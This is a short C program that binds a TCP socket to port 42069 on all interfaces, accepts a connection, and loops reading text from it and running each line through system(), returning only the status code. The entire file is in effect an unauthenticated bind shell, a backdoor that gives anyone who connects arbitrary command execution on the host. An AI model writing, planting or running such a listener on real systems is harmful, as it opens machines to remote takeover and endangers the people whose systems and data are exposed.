#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define PORT 42069
#define BUFFER_SIZE 256

void main(){
    // variables
    struct sockaddr_in addr;
    struct sockaddr client;
    int socket_fd, connection_socket_fd, code;
    char buffer[BUFFER_SIZE];

    // create socket
    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(socket_fd == -1){
        printf("Error opening socket\n");
        return;
    }

    // setup socket binding settings
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = 0;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_family = AF_INET;

    // bind socket
    if(bind(socket_fd, (struct sockaddr *) & addr, sizeof(struct sockaddr_in) ) == -1){
        printf("Error binding socket\n");
        return;
    }

    // notify if successful
    printf("Socket bound to port %i\n", PORT);

    // wait for connection
    listen(socket_fd, 5);

    // accept any connection
    int clienlen = sizeof(client);
    connection_socket_fd = accept(socket_fd, &client, &clienlen);
    if(connection_socket_fd < 0){
        printf("Error on accept\n");
        return;
    }

    // continuous loop of recieveing and executing commands
    while(1){
        
        // wait for request/command and then read it
        bzero(buffer, BUFFER_SIZE);
        code = read(connection_socket_fd, buffer, 255);
        if(code < 0){
            printf("Error reading from socket\n");
            continue;
        }

        // print command and then execute it
        printf("> %s", buffer);
        int status = system(buffer);

        // return status quote to client
        char response[50];
        sprintf(response, "Status code: %i", status);
        code = write(connection_socket_fd, response, strlen(response));
        if(code < 0){
            printf("Error writing to socket\n");
            continue;
        }
    }
}